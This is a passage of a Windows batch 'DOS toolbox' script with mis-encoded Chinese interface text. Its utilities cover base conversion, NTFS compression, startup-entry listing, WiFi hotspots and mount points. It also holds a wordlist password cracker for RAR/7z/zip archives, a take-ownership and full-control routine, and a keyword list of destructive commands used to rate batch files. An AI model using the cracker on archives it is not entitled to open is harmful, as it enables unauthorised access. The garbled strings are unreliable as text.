set bajinzhi=%b%%bajinzhi%
if %shijinzhibak% neq 0 goto 36(2)
:36(3)
set/a s=%shijinzhibak3%%%16
if "%s%"=="10" set s=A
if "%s%"=="11" set s=B
if "%s%"=="12" set s=C
if "%s%"=="13" set s=D
if "%s%"=="14" set s=E
if "%s%"=="15" set s=F
set/a shijinzhibak3=%shijinzhibak3%/16
set shilioujinzhi=%s%%shilioujinzhi%
if %shijinzhibak3% neq 0 goto 36(3)
cls
echo ʮ����:%shijinzhibak2%
echo ������:%erjinzhi%
echo �˽���:%bajinzhi%
echo ʮ������:%shilioujinzhi%
echo _______________________________________________________________________________
echo �����������&pause>nul
goto 36
:shijinzhicw
echo ����ʮ��������!
ping/n 2 0.0>nul
goto 10z
:2z
cls
set srejz=
set/p srejz=���������������:
for /f "delims=01" %%a in ('echo %srejz%') do goto srejzcw
set/a nnn=1
set/a num=0
set nn=
set "n=%srejz%"
set "n=!n:0= 0!"
set "n=!n:1= 1!"
for %%a in (!n!) do set "nn=%%a !nn!"
for %%a in (!nn!) do set /a num+=%%a*nnn,nnn*=2
set ejzjg=%num%
set ejzjgbak=%ejzjg%
set ejzjgbak2=%ejzjgbak%
set ejzjgbak3=%ejzjgbak2%
:ejzjg
set/a e=ejzjg%%2
set/a ejzjg=ejzjg/2
set erjinzhi=%e%%erjinzhi%
if %ejzjg% neq 0 goto ejzjg
:ejzjg1
set/a b=%ejzjgbak%%%8
set/a ejzjgbak=%ejzjgbak%/8
set bajinzhi=%b%%bajinzhi%
if %ejzjgbak% neq 0 goto ejzjg1
:ejzjg2
set/a s=%ejzjgbak3%%%16
if "%s%"=="10" set s=A
if "%s%"=="11" set s=B
if "%s%"=="12" set s=C
if "%s%"=="13" set s=D
if "%s%"=="14" set s=E
if "%s%"=="15" set s=F
set/a ejzjgbak3=%ejzjgbak3%/16
set shilioujinzhi=%s%%shilioujinzhi%
if %ejzjgbak3% neq 0 goto ejzjg2
cls
echo ʮ����:%ejzjgbak2%
echo ������:%erjinzhi%
echo �˽���:%bajinzhi%
echo ʮ������:%shilioujinzhi%
echo _______________________________________________________________________________
echo �����������&pause>nul
goto 36
:srejzcw
echo ���Ƕ���������!
ping/n 2 0.0>nul
goto 2z
:vbsjsq
title vbs������%system%
set vbsbds=
set vbsjieguo=
cls
echo e=���ز˵�
set/p vbsbds=��������ʽ:
:for /f "delims=eE" %%a in ('echo %vbsbds%') do goto js
if /i "%vbsbds%"=="e" if "!tzwz!" equ "!start!" (goto memuv2) else (goto !tzwz!)
:js
echo msgbox %vbsbds%,"65","VBS������">%systemdrive%\windows\temp.vbs
%systemdrive%\windows\temp.vbs
del/f/q %systemdrive%\windows\temp.vbs
goto vbsjsq
:guanyu
title ����DOS������%system%%gxflag%
if %daxiao%==%versize% set daxiao1=%daxiao%�ֽ�
if %daxiao% neq %versize% set daxiao1=%daxiao%�ֽ�  (�ļ���С�쳣,�����ѱ��޸�)
set dosjssj=%time%
call :sjc "%dosqssj%" "%dosjssj%"
cls
echo ����DOS������
echo _______________________________________________________________________________
echo �汾: 1.9.1 (%ver%.%versize%)
echo ����ϵͳ: %system:~3% %bit%λ
echo ��Ȩ���� 2012-2024 Administrator ��������Ȩ��
echo _______________________________________________________________________________
echo ����������:%sjc:~0,2%ʱ%sjc:~2,2%��%sjc:~4,2%.%sjc:~6,2%��
echo DOS����������·��:%weizhi%
echo �ļ���С:%daxiao1%
echo _______________________________________________________________________________
echo ����������ز˵�&pause>nul
if "!tzwz!" equ "!start!" (goto memuv2) else (goto !tzwz!)
:37
title �ı����%system%
cls
echo _______________________________________________________________________________
echo Ҫ��ʾ����ļ�,���ÿո����·��,��ʾ�ļ��Ժ�:
echo F=��ʾ�¸��ļ�,Q=�˳�,�Ⱥ���ʾ����,�ո���ʾ��һҳ,�س���ʾ��һ��
echo _______________________________________________________________________________
set wenben=
set/p wenben=�϶���Ҫ��ʾ���ļ����˴���:
if "%wenben:~0,1%%wenben:~-1%" neq """" for /f "delims=" %%a in ('"echo %wenben%"') do (set %wenben%="%%~a")
echo _______________________________________________________________________________
more/e/p "%wenben%"
echo _______________________________________________________________________________
echo ����������ز˵�&pause>nul
goto memuv2
:38
title ��ʾ��������û�������%system%
cls
echo _______________________________________________________________________________
gpresult/z
echo _______________________________________________________________________________
echo ����������ز˵�&pause>nul
goto memuv2
:39
title NTFSѹ��%system%
cls
echo �˹���ֻ������NTFS����,Ҫѹ�����߽�ѹ����ļ�,���ÿո����·��.
echo _______________________________________________________________________________
echo [1]NTFSѹ��
echo [2]NTFS��ѹ
echo [3]NTFSѹ���ļ���
echo [4]NTFS��ѹ�ļ���
echo [0]���ز˵�
echo _______________________________________________________________________________
choice /c 12340 /n /m ���������ѡ��:
if "%errorlevel%" equ "1" goto yasuo
if "%errorlevel%" equ "2" goto jieya
if "%errorlevel%" equ "3" goto yasuowjj
if "%errorlevel%" equ "4" goto jieyawjj
if "%errorlevel%" equ "5" goto memuv2
goto 39
set ntfsys=
set/p ntfsys=���������ѡ��:
set ntfsys="%ntfsys:|=%"
if !ntfsys!=="1" goto yasuo
if !ntfsys!=="2" goto jieya
if !ntfsys!=="3" goto yasuowjj
if !ntfsys!=="4" goto jieyawjj
if !ntfsys!=="0" goto memuv2
echo ��������ȷ��ѡ��
ping/n 2 0.0>nul
goto 39
:jieya
title NTFS��ѹ%system%
cls
set jieya=
set/p jieya=�϶���Ҫ��ѹ���ļ����˴���:
if "%jieya:~0,1%%jieya:~-1%" neq """" for /f "delims=" %%a in ('"echo %jieya%"') do (set %jieya%="%%~a")
echo _______________________________________________________________________________
compact /u /a /i /f "%jieya%"
echo _______________________________________________________________________________
echo ����������ز˵�&pause>nul
goto 39
:yasuo
title NTFSѹ��%system%
cls
set yasuo=
set/p yasuo=�϶���Ҫѹ�����ļ����˴���:
if "%yasuo:~0,1%%yasuo:~-1%" neq """" for /f "delims=" %%a in ('"echo %yasuo%"') do (set %yasuo%="%%~a")
echo _______________________________________________________________________________
compact /c /a /i /f "%yasuo%"
echo _______________________________________________________________________________
echo ����������ز˵�&pause>nul
goto 39
:jieyawjj
title NTFS��ѹ�ļ���%system%
cls
set jieya=
set/p jieya=�϶���Ҫ��ѹ���ļ��е��˴���:
if "%jieya:~0,1%" neq """" for /f "delims=" %%a in ('"echo %jieya%"') do (set %jieya%="%%~a")
echo _______________________________________________________________________________
compact /u /a /i /f /s:"%jieya%"
echo _______________________________________________________________________________
echo ����������ز˵�&pause>nul
goto 39
:yasuowjj
title NTFSѹ���ļ���%system%
cls
set jieya=
set/p jieya=�϶���Ҫѹ�����ļ��е��˴���:
if "%jieya:~0,1%%jieya:~-1%" neq """" for /f "delims=" %%a in ('"echo %jieya%"') do (set %jieya%="%%~a")
echo _______________________________________________________________________________
compact /c /a /i /f /s:"%jieya%"
echo _______________________________________________________________________________
echo ����������ز˵�&pause>nul
goto 39
:40
title ��ȡ�ļ�����Ȩ��%system%
cls
echo �˹���ֻ������NTFS����
echo _______________________________________________________________________________
set ntfswjqx=
set/p ntfswjqx=�϶���Ҫ��ȡ����Ȩ�޵��ļ������ļ��е��˴���:
if "%ntfswjqx:~0,1%%ntfsjqx:~-1%" neq """" for /f "delims=" %%a in ('"echo %ntfswjqx%"') do (set %ntfswjqx%="%%~a")
echo _______________________________________________________________________________
attrib -s -h -r "%ntfswjqx%" 2>nul
takeown/f "%ntfswjqx%" 2>nul
takeown/f "%ntfswjqx%" 2>nul
attrib -s -h -r "%ntfswjqx%" 2>nul
echo y|cacls "%ntfswjqx%" /t /c /g %username%:f 2>nul
attrib -s -h -r "%ntfswjqx%" 2>nul
echo _______________________________________________________________________________
echo ����������ز˵�&pause>nul
goto memuv2
:41
title ��ʾ����������%system%
cls
echo _______________________________________________________________________________
if /i "%system:~18,1%"=="x" dir/a/s/b "%systemdrive%\Documents and Settings\%username%\����ʼ���˵�\����\����"
if /i "%system:~18,1%"=="x" dir/a/s/b "%systemdrive%\Documents and Settings\all users\����ʼ���˵�\����\����"
if /i "%system:~18,1%" neq "x" dir/a/s/b "%systemdrive%\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
if /i "%system:~18,1%" neq "x" dir/a/s/b "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
echo;
for /f "delims=" %%a in ('"reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run 2>nul"') do if not "%%a"=="" echo %%a&echo;
for /f "delims=" %%a in ('"reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run 2>nul"') do if not "%%a"=="" echo %%a&echo;
for /f "delims=" %%a in ('"reg query HKEY_CURRENT_USER\Software\Microsoft\WindowsNT\CurrentVersion\Windows\load 2>nul"') do if not "%%a"=="" echo %%a&echo;
for /f "delims=" %%a in ('"reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\Userinit 2>nul"') do if not "%%a"=="" echo %%a&echo;
for /f "delims=" %%a in ('"reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run 2>nul"') do if not "%%a"=="" echo %%a&echo;
for /f "delims=" %%a in ('"reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run 2>nul"') do if not "%%a"=="" echo %%a&echo;
for /f "delims=" %%a in ('"reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce 2>nul"') do if not "%%a"=="" echo %%a&echo;
for /f "delims=" %%a in ('"reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServicesOnce 2>nul"') do if not "%%a"=="" echo %%a&echo;
for /f "delims=" %%a in ('"reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices 2>nul"') do if not "%%a"=="" echo %%a&echo;
for /f "delims=" %%a in ('"reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices 2>nul"') do if not "%%a"=="" echo %%a&echo;
for /f "delims=" %%a in ('"reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce\Setup 2>nul"') do if not "%%a"=="" echo %%a&echo;
for /f "delims=" %%a in ('"reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\Setup 2>nul"') do if not "%%a"=="" echo %%a&echo;
for /f "delims=" %%a in ('"reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce 2>nul"') do if not "%%a"=="" echo %%a&echo;
for /f "delims=" %%a in ('"reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce 2>nul"') do if not "%%a"=="" echo %%a&echo;
for /f "delims=" %%a in ('"reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx 2>nul"') do if not "%%a"=="" echo %%a&echo;
for /f "delims=" %%a in ('"reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v taskman 2>nul"') do if not "%%a"=="" echo %%a&echo;
for /f "delims=" %%a in ('"reg query HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run 2>nul"') do if not "%%a"=="" echo %%a&echo;
echo _______________________________________________________________________________
echo ����������ز˵�&pause>nul
goto memuv2
:kcd
start mshta "javascript:new ActiveXObject('WMPlayer.OCX').cdromCollection.Item(0).Eject();window.close();"
if "!tzwz!" equ "!start!" (goto memuv2) else (goto !tzwz!)
:gcd
start mshta "javascript:with (new ActiveXObject('WMPlayer.OCX').cdromCollection.Item(0)){Eject();Eject();}window.close();"
if "!tzwz!" equ "!start!" (goto memuv2) else (goto !tzwz!)
:42
title �����Ķ���%system%
cls
echo ������Ҫ�Ķ�������:
echo _______________________________________________________________________________
set ydnr=
set/p ydnr=
start mshta vbscript:createobject("sapi.spvoice").speak("%ydnr%")(window.close)
echo _______________________________________________________________________________
echo ����������ز˵�&pause>nul
goto memuv2
:43
title �������ļ����շ���%system%
set dx=0
cls
set batfx=
set/p batfx=�϶�Ҫ�������ļ����˴���:
if "%batfx:~0,1%%batfx:~-1%" neq """" for /f "delims=" %%a in ('"echo %batfx%"') do (set %batfx%="%%~a")
echo _______________________________________________________________________________
find /n /i "del" "%batfx%"&&set/a dx=%dx%+1
find /n /i "rd" "%batfx%"&&set/a dx=%dx%+1
find /n /i "arp" "%batfx%"&&set/a dx=%dx%+1
find /n /i "assoc" "%batfx%"&&set/a dx=%dx%+1
find /n /i "attrib" "%batfx%"&&set/a dx=%dx%+1
find /n /i "cacls" "%batfx%"&&set/a dx=%dx%+1
find /n /i "format" "%batfx%"&&set/a dx=%dx%+1
find /n /i "ftype" "%batfx%"&&set/a dx=%dx%+1
find /n /i "taskkill" "%batfx%"&&set/a dx=%dx%+1
find /n /i "taskl" "%batfx%"&&set/a dx=%dx%+1
find /n /i "reg" "%batfx%"&&set/a dx=%dx%+1
find /n /i "ren" "%batfx%"&&set/a dx=%dx%+1
find /n /i "regsvr32" "%batfx%"&&set/a dx=%dx%+1
find /n /i "rd" "%batfx%"&&set/a dx=%dx%+1
find /n /i "schtask" "%batfx%"&&set/a dx=%dx%+1
find /n /i "shutdown" "%batfx%"&&set/a dx=%dx%+1
echo _______________________________________________________________________________
echo �������ļ�: %batfx%
echo Σ�յȼ�: %dx%
echo _______________________________________________________________________________
echo ����������ز˵�&pause>nul
goto memuv2
:44
title �ļ�����%system%
cls
set sswjm=
set/p sswjm=������Ҫ�������ļ���(Ĭ����%systemdrive%\������):
echo _______________________________________________________________________________
dir/a/s %sswjm%
echo _______________________________________________________________________________
echo ����������ز˵�&pause>nul
goto memuv2
:45
title �޸����𻵵��ļ�%system%
cls
set xfwj=
set/p xfwj=�϶�Ҫ�޸����ļ����˴���:
if "%xfwj:~0,1%%xfwj:~-1%" neq """" for /f "delims=" %%a in ('"echo %xwfj%"') do (set %xfwj%="%%~a")
echo _______________________________________________________________________________
recover %xfwj%
echo _______________________________________________________________________________
echo ����������ز˵�&pause>nul
goto memuv2
:46
title �����ƽ�ѹ��������%system%
cls
set rarazlj=
set yswjlj=
set pjzd=
set ppjm=
for /f "delims=" %%a in ('"reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\WinRAR.exe" /v path|find "path""') do (set rarazlj=%%a)
if "%system:~8,2%"=="XP" (set rarpd=%rarazlj:~16%\Rar.exe&set rarpd7z=%rarazlj:~16%\winrar.exe) else (set rarpd=%rarazlj:~22%\Rar.exe&set rarpd7z=%rarazlj:~22%\winrar.exe)
cls
if exist "%rarpd%" (goto rarjs) else (echo û�а�װWinRAR.����������ز˵�&pause>nul&goto memuv2)
:rarjs
cls
set/p yswjlj=�϶�Ҫ�ƽ��ѹ�������˴���(e=���ز˵�):
if "%yswjlj:~0,1%%yswjlj:~-1%" neq """" for /f "delims=" %%a in ('"echo %yswjlj%"') do (set %yswjlj%="%%~a")
for /f "delims=" %%a in ("%yswjlj%") do if %%~xa==.7z goto rarwjok1
for /f "delims=" %%a in ("%yswjlj%") do if %%~xa==.rar goto rarwjok
for /f "delims=" %%a in ("%yswjlj%") do if %%~xa==.zip goto rarwjok1
if /i "%yswjlj%"=="e" goto memuv2
echo ��Ч���ļ���ʽ��&ping/n 2 0.0>nul
goto 46
:rarwjok
set/p pjzd=�϶��ֵ��ļ����˴���(e=���ز˵�):
if "%pjzd:~0,1%%pjzd:~-1%" neq """" for /f "delims=" %%a in ('"echo %pjzd%"') do (set %pjzd%="%%~a")
for /f "delims=" %%a in ("%pjzd%") do if %%~xa==.txt goto kspj
if /i "%pjzd%"=="e" goto memuv2
echo ����txt�ļ���&ping/n 2 0.0>nul
goto 46
:rarwjok1
set/p pjzd=�϶��ֵ��ļ����˴���(e=���ز˵�):
if "%pjzd:~0,1%%pjzd:~-1%" neq """" for /f "delims=" %%a in ('"echo %pjzd%"') do (set %pjzd%="%%~a")
for /f "delims=" %%a in ("%pjzd%") do if %%~xa==.txt goto kspj1
if /i "%pjzd%"=="e" goto memuv2
echo ����txt�ļ���&ping/n 2 0.0>nul
goto 46
:kspj
echo _______________________________________________________________________________
rd/s/q %systemdrive%windows\temp\DOS��������ʱ��ѹ·��>nul 2>nul
md %systemdrive%windows\temp\DOS��������ʱ��ѹ·��
for /f "delims=" %%a in ('type "%pjzd%"') do (
cls
echo �����ƽ��ѹ����:%yswjlj%
echo;
echo ����ʹ�õ��ֵ��ļ�:%pjzd%
echo;
set pjmm=%%a
echo ���ڳ�������:%%a
"%rarpd%" x -y -inul -p%%a "%yswjlj%" "%systemdrive%windows\temp\DOS��������ʱ��ѹ·��"
dir/s/b %systemdrive%windows\temp\DOS��������ʱ��ѹ·��|find  /v "�Ҳ����ļ�"&&goto pjcg)
echo _______________________________________________________________________________
echo �ƽ�ʧ�ܣ�
echo;
echo �ֵ���û����ȷ������.
echo _______________________________________________________________________________
echo ����������ز˵�&pause>nul
goto memuv2
:pjcg
echo _______________________________________________________________________________
echo �ƽ�ɹ���
echo;
echo ѹ����%yswjlj%
echo ��ѹ������:%pjmm%
echo _______________________________________________________________________________
echo ����������ز˵�&pause>nul
goto memuv2
:kspj1
echo _______________________________________________________________________________
rd/s/q %systemdrive%windows\temp\DOS��������ʱ��ѹ·��>nul 2>nul
md %systemdrive%windows\temp\DOS��������ʱ��ѹ·��
for /f "delims=" %%a in ('type "%pjzd%"') do (
cls
echo �����ƽ��ѹ����:%yswjlj%
echo;
echo ����ʹ�õ��ֵ��ļ�:%pjzd%
echo;
set pjmm=%%a
echo ���ڳ�������:%%a
"%rarpd7z%" x -y -inul -p%%a "%yswjlj%" "%systemdrive%windows\temp\DOS��������ʱ��ѹ·��"
dir/s/b %systemdrive%windows\temp\DOS��������ʱ��ѹ·��|find  /v "�Ҳ����ļ�"&&goto pjcg1)
echo _______________________________________________________________________________
echo �ƽ�ʧ�ܣ�
echo;
echo �ֵ���û����ȷ������.
echo _______________________________________________________________________________
echo ����������ز˵�&pause>nul
goto memuv2
:pjcg1
echo _______________________________________________________________________________
echo �ƽ�ɹ���
echo;
echo ѹ����%yswjlj%
echo ��ѹ������:%pjmm%
echo _______________________________________________________________________________
echo ����������ز˵�&pause>nul
goto memuv2
:47
title Wifi�ȵ�%system%
cls
echo _______________________________________________________________________________
echo [1]����Wifi�ȵ�
echo [2]�ر�Wifi�ȵ�
echo [3]�鿴��������
echo [0]���ز˵�
echo _______________________________________________________________________________
choice /c 1230 /n /m ���������ѡ��:
if "%errorlevel%" equ "1" goto kqwifi
if "%errorlevel%" equ "2" goto gbwifi
if "%errorlevel%" equ "3" goto wlpz
if "%errorlevel%" equ "4" goto memuv2
goto 47
set wifixz=
set/p wifixz=���������ѡ��:
set wifixz="%wifixz:|=%"
if !wifixz!=="1" goto kqwifi
if !wifixz!=="2" goto gbwifi
if !wifixz!=="3" goto wlpz
if !wifixz!=="0" goto memuv2
echo ��������ȷ��ѡ�
ping/n 2 0.0>nul
goto 47
:kqwifi
title ����Wifi�ȵ�%system%
cls
set wifissid=
set wifimiam=
set/p wifissid=������Wifi����(SSID):
set/p wifimima=������Wifi����(����λ��:8��63λ):
cls
net start sharedaccess 2>nul
netsh wlan stop hostednetwork
netsh wlan set hostednetwork mode=allow ssid="%wifissid%" key=%wifimima%
netsh wlan start hostednetwork
echo _______________________________________________________________________________
echo ����޷��������ֶ���ȡIP��ַ(�������ϵͳ����ǽҲ���޷����ӳɹ�)
echo Wifi����(SSID):%wifissid%
echo Wifi����:%wifimima%
echo _______________________________________________________________________________
echo �����������&pause>nul
goto 47
:gbwifi
title �ر�Wifi�ȵ�%system%
cls
netsh wlan stop hostednetwork
echo _______________________________________________________________________________
echo �����������&pause>nul
goto 47
:wlpz
title �鿴��������%system%
cls
ipconfig /all
echo _______________________________________________________________________________
echo �����������&pause>nul
goto 47
:48
title ������chm�ļ�%system%
cls
set chmlj=
echo �϶�Ҫ�������chm�ļ����˴���
set/p chmlj=���������ļ�����������(e=����):
set chmlj="%chmlj:|=%"
if /i !chmlj!=="e" goto memuv2
if "%chmlj:~0,1%%chmlj:~-1%" neq """" for /f "delims=" %%a in ('"echo %chmlj%"') do (set %chmlj%="%%~a")
for /f "delims=" %%a in ("%chmlj%") do (
if /i not %%~xa==.chm goto nochm
set chmcglj=
set chmcglj=%%~na
copy/y "%chmlj%" %systemdrive%\windows\temp\tmp.chm
hh -decompile %systemdrive%\windows\temp\chm %systemdrive%\windows\temp\tmp.chm
md "%zmlj%%%~na"
xcopy/c/e/y %systemdrive%\windows\temp\chm "%zmlj%%%~na"
rd/s/q %systemdrive%\windows\temp\chm
del/f/q %systemdrive%\windows\temp\tmp.chm)
:chmcg
cls
echo ������ɹ���
echo �Ա��浽%zmlj%%chmcglj%
echo _______________________________________________________________________________
echo ����������ز˵�&pause>nul
goto memuv2
:nochm
echo _______________________________________________________________________________
echo ����chm�ļ���
ping/n 2 0.0>nul
goto 48
:xz
title ж��DOS������%system%
cls
set xzgjx=
set/p xzgjx=�Ƿ�ж�ع�����(Y/N)?
set xzgjx="%xzgjx:|=%"
if /i !xzgjx!=="y" goto xzgjx
if /i !xzgjx!=="n" if "!tzwz!" equ "!start!" (goto memuv2) else (goto !tzwz!)
echo ��������ȷ��ѡ��
ping/n 2 0.0>nul
goto xz
:xzgjx
reg delete HKEY_CURRENT_USER\System\DOS������ /f>nul 2>nul
rd/s/q %systemdrive%\dos��������ʱĿ¼>nul 2>nul
cls
echo ж�سɹ�
ping/n 2 0.0>nul
if "!errorlevel!" equ "0" (del/f/q %0)
exit 0
:49
title �ر�����Ӧ����%system%
cls
taskkill /f /fi "status eq not responding"
echo _______________________________________________________________________________
echo ����������ز˵�&pause>nul
if "!tzwz!" equ "!start!" (goto memuv2) else (goto !tzwz!)
:50
title �ļ��Ƚ���%system%
cls
echo �϶�Ҫ�Ƚϵ��ļ����˴���(�ȽϹ��������� "Ctrl+C" 2�οɽ����Ƚ�)
echo _______________________________________________________________________________
set/p wj1=��һ��Ҫ�Ƚϵ��ļ�:
set/p wj2=�ڶ���Ҫ�Ƚϵ��ļ�:
echo _______________________________________________________________________________
fc/b %wj1% %wj2%
echo _______________________________________________________________________________
echo ����������ز˵�&pause>nul
goto memuv2
:51
title ������д����а�%system%
set nz=
cls
set/p  nz=������Ҫд�뵽���а����������:
mshta vbscript:clipboardData.SetData("text","%nz%")(window.close)
if %errorlevel%==0 (set nz=0) else (set nz=1)
echo _______________________________________________________________________________
if %nz%==0 (echo д��ɹ�) else (echo д��ʧ��)
echo ����������ز˵�&pause>nul
goto memuv2
:52
cls
start services.msc
goto memuv2
:53
cls
title ��֪�����ռ�������%system%
set jsxq=00000000
set/p jsxq=������������(����20150605):
for /f "delims=0123456789" %%a in ('echo %jsxq%') do goto wstg3
for /l %%a in (0,1,1000) do if "!jsxq:~%%a,1!"=="" set b=%%a&&goto wstg2
:wstg2
if %b%==8 goto jsxq
:wstg3
echo ��������ȷ�ĸ�ʽ!
ping/n 2 0.0>nul
goto 53
:jsxq
set y=%jsxq:~0,4%
if %y% lss 10 set/a y=0x%y%
set m=%jsxq:~4,2%
if %m% lss 10 set/a m=0x%m%
if %m%==1 set m=13&set/a y=%y%-1
if %m%==2 set m=14&set/a y=%y%-1
set d=%jsxq:~6,2%
if %d% lss 10 set/a d=0x%d%
set/a d=%d%+1
set/a w=%d%+2*%m%+3*(%m%+1)/5+%y%+%y%/4-%y%/100+%y%/400
set/a w=%w%%%7
set/a rn1=%y%%%4
set/a rn2=%y%%%100
set/a rn3=%y%%%400
set rn=ƽ��
if %rn1%==0 if %rn2% neq 0 set rn=����
if %rn2%==0 if %rn3%==0 set rn=����
if %w%==1 set w=һ
if %w%==2 set w=��
if %w%==3 set w=��
if %w%==4 set w=��
if %w%==5 set w=��
if %w%==6 set w=��
if %w%==0 set w=��
echo;
echo %rn% %jsxq:~0,4%��%jsxq:~4,2%��%jsxq:~6,2%��������%w%
echo _______________________________________________________________________________
echo ����������ز˵�&pause>nul
goto memuv2
:54
cls
title ��ѯϵͳ����״̬%system%
echo ����ϵͳ: %system:~3% %bit%λ
if "!system:~8,2!"=="XP" echo Windows XPϵͳ�޷�ʹ�ô˹��ܲ�ѯ
echo _______________________________________________________________________________
echo [1]��ʾ�����Ϣ
echo [2]��ʾ��ϸ�������Ϣ
echo [3]��ʾ��ǰ���״̬�Ľ�ֹ����
echo [0]���ز˵�
echo _______________________________________________________________________________
choice /c 1230 /n /m ���������ѡ��:
if "%errorlevel%" equ "1" start slmgr.vbs -dli&goto 54
if "%errorlevel%" equ "2" start slmgr.vbs -dlv&goto 54
if "%errorlevel%" equ "3" start slmgr.vbs -xpr&goto 54
if "%errorlevel%" equ "4" goto memuv2
goto 54
set cxxz=
set/p cxxz=���������ѡ��:
set cxxz="%cxxz:|=%"
if !cxxz!=="1" start slmgr.vbs -dli&goto 54
if !cxxz!=="2" start slmgr.vbs -dlv&goto 54
if !cxxz!=="3" start slmgr.vbs -xpr&goto 54
if !cxxz!=="0" goto memuv2
echo ��������ȷ��ѡ�
ping/n 2 0.0>nul
goto 54
:55
cls
title ����ָ���ļ��Ŀ�ݷ�ʽ������%system%
set kjfs=
set/p kjfs=���϶�Ŀ���ļ����˴���:
if "!kjfs!"=="" goto 55(1)
if "%kjfs:~0,1%%kjfs:~-1%" neq """" for /f "delims=" %%a in ('"echo %kjfs%"') do (set %kjfs%="%%~a")
for /f "delims=" %%a in ("%kjfs%") do set kjfsmc=%%~na
mshta VBScript:Execute("Set a=CreateObject(""WScript.Shell""):Set b=a.CreateShortcut(a.SpecialFolders(""Desktop"") & ""\%kjfsmc%.lnk""):b.TargetPath=""%kjfs%"":b.WorkingDirectory=""%~dp0"":b.Save:close")
:55(1)
echo _______________________________________________________________________________
echo ����������ز˵�&pause>nul
goto memuv2
:56
cls
start msconfig.exe
goto memuv2
:57
cls
title ����ͳ��%system%
set zstj=
set/p zstj=����������:
call :zfccd "%zstj%"
echo �ܼ�%zfcgs%����(����������)
echo _______________________________________________________________________________
echo ����������ز˵�&pause>nul
goto memuv2
:58
cls
title ������������%system%
set swjj=
set cwjj=
set/p swjj=����Ҫ���ӵ��ļ���·��:
set/p cwjj=���������ļ��е����·��:
if "%swjj:~0,1%%swjj:~-1%" neq """" for /f "delims=" %%a in ('"echo %swjj%"') do (set %swjj%="%%~a")
if "%cwjj:~0,1%%cwjj:~-1%" neq """" for /f "delims=" %%a in ('"echo %cwjj%"') do (set %cwjj%="%%~a")
mklink /d %cwjj% %swjj%
echo _______________________________________________________________________________
echo ����������ز˵�&pause>nul
goto memuv2
:59
title �򿪹������̨%system%
cls
start mmc
goto memuv2
:60
cls
title ���Streams�ļ�����%system%
set jcwjsd=
set/p jcwjsd=�϶�Ŀ���ļ����˴���:
if "%jcwjsd:~0,1%%jcwjsd:~-1%" neq """" for /f "delims=" %%a in ('"echo %jcwjsd%"') do (set %jcwjsd%="%%~a")
echo>"%jcwjsd%:Zone.Identifier"
echo �������
echo _______________________________________________________________________________
echo ����������ز˵�&pause>nul
goto memuv2
:61
title ������ɾ�����г���װ���%system%
cls
echo _______________________________________________________________________________
echo [1]�г���װ���
echo [2]ɾ������ϵͳ�еġ����װ���Ŀ¼��ע�������
echo [3]�г�ָ��Ŀ¼����װ��ľ�����
echo [4]�����̷�(������װ���)
echo [5]ɾ���̷�(ɾ����װ���)
echo [0]���ز˵�
echo _______________________________________________________________________________
choice /c 123450 /n /m ���������ѡ��:
if "%errorlevel%" equ "1" goto 61(1)
if "%errorlevel%" equ "2" goto 61(2)
if "%errorlevel%" equ "3" goto 61(3)
if "%errorlevel%" equ "4" goto 61(4)
if "%errorlevel%" equ "5" goto 61(5)
if "%errorlevel%" equ "6" goto memuv2
goto 61
set gzxz=
set/p gzxz=���������ѡ��:
set gzxz="%gzxz:|=%"
if !gzxz!=="1" goto 61(1)
if !gzxz!=="2" goto 61(2)
if !gzxz!=="3" goto 61(3)
if !gzxz!=="4" goto 61(4)
if !gzxz!=="5" goto 61(5)
if !gzxz!=="0" goto memuv2
echo ��������ȷ��ѡ�
ping/n 2 0.0>nul
goto 61
:61(1)
title �г���װ���%system%
cls
for /f "skip=22" %%a in ('"mountvol"') do echo %%a
echo _______________________________________________________________________________
echo �����������&pause>nul
goto 61
:61(2)
title ɾ������ϵͳ�е�,���װ���Ŀ¼��ע�������%system%
cls
mountvol /r
echo �������
echo _______________________________________________________________________________
echo �����������&pause>nul
goto 61
:61(3)
title �г�ָ��Ŀ¼����װ��ľ�����%system%
cls
fsutil fsinfo drives
echo _______________________________________________________________________________
set xszz=
set/p xszz=��������Ҫ��ʾ���̷�:
cls
echo %xszz%:\&mountvol %xszz%: /l
echo _______________________________________________________________________________
echo �����������&pause>nul
goto 61
:61(4)
title �����̷�(������װ���)%system%
cls
set xx1=0
for /f "delims=" %%a in ('"mountvol|find "\\?\Volume""') do (set/a xx1=!xx1!+1
set b!xx1!=%%a
echo [!xx1!]%%a)
echo [0]�����ϼ��˵�
echo _______________________________________________________________________________
set cjpf=
set/p cjpf=ѡ��װ���:
if "%cjpf%"=="" goto 61(4)
if !cjpf!==0 goto 61
set xzpf=
set/p xzpf=�����̷�:
mountvol %xzpf%: !b%cjpf%!
echo �������
echo _______________________________________________________________________________
echo �����������&pause>nul
goto 61
:61(5)
title ɾ���̷�(ɾ����װ���)%system%
cls
fsutil fsinfo drives
echo _______________________________________________________________________________
set scpf=
set/p scpf=��������Ҫɾ�����̷�:
mountvol %scpf%: /d
echo �������
